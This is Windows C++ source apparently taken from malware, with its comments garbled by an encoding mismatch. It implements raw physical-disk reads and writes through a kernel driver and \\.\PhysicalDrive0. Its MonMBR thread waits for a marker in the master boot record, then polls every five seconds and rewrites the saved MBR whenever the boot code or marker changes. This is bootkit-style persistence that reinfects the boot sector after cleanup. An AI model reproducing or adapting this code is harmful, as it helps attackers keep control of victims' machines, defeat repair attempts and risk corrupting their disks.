////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include "Common.h"


//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//
extern	HANDLE		g_hDriver;
extern	char		g_szSystemPath[MAX_PATH];
//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//
//--------------------------------------------------------------------------//

#define	SECTORSIZE	512		//������С

#define IOCTL_DISK_INITIAL			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90E, METHOD_IN_DIRECT, FILE_ANY_ACCESS)
#define IOCTL_DISK_READWRITE		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90F, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

#pragma pack(1)
typedef	struct	__RWINFO{
	unsigned __int64	LBA;
	USHORT	usSectorCount;
	DWORD	dwOperateSize;
	DWORD	dwFlags;
}RWINFO, *PRWINFO;
#pragma pack()

DWORD				g_dwCurHDDId = 0, g_dwDiskInitial = 0;

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//��ȡϵͳ�����ڵ�Ӳ�̵�MBR��'Windows disk signature', ���������ҵ�����Ӳ��
DWORD GetCurHDDSign()
{
	DWORD	dwSignature = 0;
	char	szVN[MAX_PATH];
	HANDLE	hFile = INVALID_HANDLE_VALUE;


	//��·��
	wsprintf(szVN, "\\\\.\\%C:", *g_szSystemPath);

	//��ȡ�˷���(��)��Ϣ
	hFile = CreateFile(szVN, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		char	cOutBuf[512];//ע���С
		DWORD	dwByte = 0;
		

		memset(cOutBuf, 0, sizeof(cOutBuf));
		if(DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, cOutBuf, sizeof(cOutBuf), &dwByte, NULL) == TRUE)
		{
			dwSignature = (DiskGeometryGetPartition( (DISK_GEOMETRY_EX*)&cOutBuf[0] ))->Mbr.Signature;
		}

		CloseHandle( hFile );
	}

	return dwSignature;
}

//ֱ�Ӷ�дӲ��ǰ�ĳ�ʼ��
BOOL DiskInitial()
{
	if(g_hDriver != INVALID_HANDLE_VALUE)
	{
		DWORD	dwByte = 0, dwSignatrue = 0;

		dwSignatrue = GetCurHDDSign();
		if(dwSignatrue != 0)
		{
			return DeviceIoControl(g_hDriver, IOCTL_DISK_INITIAL, &dwSignatrue, sizeof(dwSignatrue), NULL, 0, &dwByte, NULL);
		}
		//////else
		//////{
		//////	//��ȡӲ�̵����к�,�����кŽ���ƥ��
		//////	//CreateFile(volume,....)
		//////	//DeviceIoControl(, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, ....)
		//////	//CreateFile(\\\\.\\PhysicalDrive + DISK_EXTENT.DiskNumber, .... )
		//////	//DeivceIoControl(, SMART_RCV_DRIVE_DATA, )
		//////	;
		//////}
	}

	return FALSE;
}

//��������ͨ��I/O�˿�ֱ�Ӷ�д������Ӳ��. 1 - ��, 2 - д, �ɹ����� 0, ����ʧ��.
DWORD DiskReadWrite(unsigned __int64 LBA, USHORT usSectorCount, char *pBuffer, DWORD dwBufSize, DWORD dwFlags)
{
	#define	SECTIONSIZE		512

	DWORD	dwResult = 0, dwByte = 0;
	RWINFO	RwInfo;



	//�����Ҫ,��ʼ��
	if(g_dwDiskInitial == 0)
	{
		g_dwDiskInitial = 1;
		if(DiskInitial() == FALSE)
		{
			g_dwDiskInitial = 2;
		}
	}
	if(g_dwDiskInitial != 1)
	{
		dwResult = 2;
		goto __END;
	}

	//�������
	if((usSectorCount < 1) || dwBufSize < (SECTORSIZE * (DWORD)usSectorCount))
	{
		dwResult = 1;
		goto __END; 
	}

	//����
	RwInfo.LBA = LBA;
	RwInfo.usSectorCount = usSectorCount;
	RwInfo.dwOperateSize = RwInfo.usSectorCount * SECTORSIZE;
	RwInfo.dwFlags = dwFlags;

	if(DeviceIoControl(g_hDriver, IOCTL_DISK_READWRITE, &RwInfo, sizeof(RwInfo), pBuffer, dwBufSize, &dwByte, NULL) == FALSE)
	{
		dwResult = 3;
		goto __END;
	}

__END:
	return dwResult;
}


DWORD DiskRead( IN __int64 qwStartSector, IN DWORD dwSectors, OUT PVOID pOutBuffer )
{
	DWORD			dwResult		= 0;
	BOOL			bResult			= FALSE;
	DWORD			dwNeedBytes		= 0;
	DWORD			dwBytesRet		= 0;
	HANDLE			hDevice			= (HANDLE)0;//INVALID_HANDLE_VALUE;
	char			szDevName[32]	= {0};
	LARGE_INTEGER	BytesOffset;
//		__g_diskhandle[0] = NULL;

	do
	{
		if ( NULL == pOutBuffer  )
		{
			dwResult = 1; break;
		}

//		if ( __g_diskhandle[0] == NULL )
		{
//			sprintf( szDevName, ("\\\\.\\PhysicalDrive%u"), 0 );
			hDevice = ::CreateFile( "\\\\.\\PhysicalDrive0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL|FILE_FLAG_NO_BUFFERING, NULL );
			if ( INVALID_HANDLE_VALUE == hDevice )
			{
				dwResult = ( ::GetLastError() ); break;
			}
//			__g_diskhandle[0] = hDevice;
		}

//		hDevice = __g_diskhandle[0];

		BytesOffset.QuadPart = qwStartSector;
		BytesOffset.QuadPart *= 512;
		dwResult = ::SetFilePointer( hDevice, BytesOffset.LowPart, &(BytesOffset.HighPart), FILE_BEGIN );
		if ( INVALID_SET_FILE_POINTER == dwResult )
		{
			dwResult = ::GetLastError();
			if ( 0 != dwResult )
			{
				( dwResult ); break;
			}
		}
		dwResult = 0;
		dwNeedBytes	= dwSectors * 512;
		bResult = ::ReadFile( hDevice, pOutBuffer, dwNeedBytes, &dwBytesRet, NULL );
		if ( !bResult )
		{
			dwResult = ( ::GetLastError() ); break;
		}
		if ( dwBytesRet != dwNeedBytes )
		{
			dwResult = 2; break;
		}
	} while(0);

	if ( INVALID_HANDLE_VALUE != hDevice )
	{
		::CloseHandle( hDevice ); hDevice = INVALID_HANDLE_VALUE;
	}

	return dwResult;
}

DWORD DiskWrite(  IN __int64 qwStartSector, IN DWORD dwSectors, IN PVOID pInBuffer )
{
	DWORD			dwResult		= 0;
	BOOL			bResult			= FALSE;
	DWORD			dwNeedBytes		= 0;
	DWORD			dwBytesRet		= 0;
	HANDLE			hDevice			= (HANDLE)0;//INVALID_HANDLE_VALUE;
	char			szDevName[32]	= {0};
	LARGE_INTEGER	BytesOffset;

	do
	{
		if ( NULL == pInBuffer )
		{
			dwResult = 1; break;
		}
//		__g_diskhandle[0] = NULL;
//		if ( __g_diskhandle[0] == NULL )
		{
		
//			sprintf( szDevName, ("\\\\.\\PhysicalDrive%u"), 0 );
			hDevice = ::CreateFile( "\\\\.\\PhysicalDrive0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL|FILE_FLAG_NO_BUFFERING, NULL );
			if ( INVALID_HANDLE_VALUE == hDevice )
			{
				dwResult = ( ::GetLastError() ); break;
			}
//			__g_diskhandle[0] = hDevice;
		}

//		hDevice = __g_diskhandle[0];

		BytesOffset.QuadPart = qwStartSector;
		BytesOffset.QuadPart *= 512;
		dwResult = ::SetFilePointer( hDevice, BytesOffset.LowPart, &(BytesOffset.HighPart), FILE_BEGIN );
		if ( INVALID_SET_FILE_POINTER == dwResult )
		{
			dwResult = ::GetLastError();
			if ( 0 != dwResult )
			{
				( dwResult ); break;
			}
		}
		dwResult = 0;
		dwNeedBytes	= dwSectors * 512;
		bResult = ::WriteFile( hDevice, pInBuffer, dwNeedBytes, &dwBytesRet, NULL );
		if ( !bResult )
		{
			dwResult = ( ::GetLastError() ); break;
		}
		if ( dwBytesRet != dwNeedBytes )
		{
			dwResult = ( ERROR_WRITE_FAULT ); break;
		}
	} while(0);

	if ( INVALID_HANDLE_VALUE != hDevice )
	{
		::CloseHandle( hDevice ); hDevice = INVALID_HANDLE_VALUE;
	}

	return dwResult;
}

DWORD DiskReadWriteAPI( unsigned __int64 LBA, USHORT usSectorCount, char *pBuffer, DWORD dwBufSize, DWORD dwFlags )
{
	if ( dwFlags == 1 )
	{
		return DiskRead(  LBA, usSectorCount, pBuffer );
	}
	else
		return DiskWrite(  LBA, usSectorCount, pBuffer );

//	memset( lpBuf, 1, dwSecs * 512 );
	return 0;
}


//�߳�, MBR���/�޸�
DWORD WINAPI MonMBR(LPVOID lpParameter)
{
	UNUSEPARAM	lpParameter;
	char		cSrcMBR[SECTORSIZE];


	if(g_hDriver == INVALID_HANDLE_VALUE)
	{
		//����û����, �޷�����;
		goto __END;
	}
	char szMsg[200];
	wsprintf(szMsg, "MonMBR..." );
	WriteLog(szMsg, 0);

	//��ȡԭ��Ⱦ��MBR(����û�и�Ⱦ, ���ù���)
	while( 1 )
	{
//		if ( DiskReadWriteAPI(0,1,cSrcMBR, sizeof(cSrcMBR),1) != 0 )
		{
			if(DiskReadWrite(0, 1, cSrcMBR, sizeof(cSrcMBR), 1) != 0)
			{
			//�޷���ȡ
				Sleep( 1000 );
				continue ;
			}

		}
		wsprintf(szMsg, "MonMBR...,%lx,%lx", *(WORD *)(cSrcMBR + 0x1fe ),  *(DWORD*)&cSrcMBR[0x1A2] );
		WriteLog(szMsg, 0);

		if ( *(WORD *)(cSrcMBR + 0x1fe ) == 0xaa55 && *(DWORD*)&cSrcMBR[0x1A2] == 0x44332211 ) 
		{
			break;
		}
		Sleep( 1000 );

	}

	//ѭ�����
	for(;;)
	{
		char	cCurMBR[SECTORSIZE];


		Sleep( 1000 * 5 );	//ÿ 5 ����һ��

//		if(DiskReadWriteAPI(0, 1, cCurMBR, sizeof(cCurMBR), 1) == 0)
		if(DiskReadWrite(0, 1, cCurMBR, sizeof(cCurMBR), 1) == 0)
		{
			//MBR�б��޸���?
			if ( *(WORD *)(cCurMBR + 0x1fe ) != 0xaa55 ) continue;
			if(	*(DWORD*)&cCurMBR[0x1A2] != 0x44332211 || *(DWORD*)&cCurMBR[0x0] != *(DWORD*)&cSrcMBR[0x0] )
			{
				//�ָ���, ��������������
				if ( *(WORD *)(cCurMBR+0x1fe) == 0xaa55 )
				{
					memcpy(&cSrcMBR[0x1B4], &cCurMBR[0x1B4], 0x4C);
					DiskReadWrite(0, 1, cSrcMBR, sizeof(cSrcMBR), 2);
				}
			}
		}
	}

__END:
	return 0;
}
